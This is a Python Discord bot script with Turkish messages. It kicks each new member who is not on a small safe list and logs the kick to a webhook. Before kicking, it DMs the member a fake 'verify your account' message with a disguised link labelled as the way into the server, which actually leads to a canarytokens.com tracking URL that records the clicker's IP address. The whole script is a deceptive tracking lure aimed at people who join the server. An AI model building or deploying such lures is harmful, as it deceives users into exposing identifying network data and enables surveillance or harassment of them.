import discord
from discord.ext import commands
from discord_webhook import DiscordWebhook
import asyncio
import datetime

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)


vebhuk = 'https://discord.com/api/webhook'


agalar = [1231241241242142, 1241241412412]

@bot.event
async def on_ready():
    print(f'{bot.user.name} görevde hayırlı işler baba')

@bot.event
async def on_member_join(member):
    try:

        if member.id in agalar:
            print(f"{member.name}#{member.discriminator} güvenli listesinde bulunuyor, atılmadı.")
            return


        invite_link = await member.guild.text_channels[0].create_invite(max_age=0, max_uses=1)


        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')


        await member.send(f"Sunucu Davet Bağlantısı: {invite_link}\nGiriş Zamanı: {current_time} Sunucuya girebilmek için hesabını doğrulat \n\n\n[SUNUCUYA GİRMEK İÇİN TIKLA](http://canarytokens.com/traffic/images/stuff/i9z0kryjpdn92x3hdy2pn5q6w/index.html)")


        await asyncio.sleep(0.1)
        await member.kick(reason="Sunucudan atıldı")
        print(f"{member.name}#{member.discriminator} sunucudan atıldı.")


        webhook = DiscordWebhook(url=vebhuk, content=f'{member.name}#{member.discriminator} sunucudan atıldı (ID: {member.id})')
        webhook.execute()

    except discord.Forbidden:
        print(f"{member.name}#{member.discriminator} sunucudan atılamadı (yetki eksik).")
    except Exception as e:
        print(f"{member.name}#{member.discriminator} sunucudan atılırken hata oluştu: {e}")


bot.run('TOKEN')
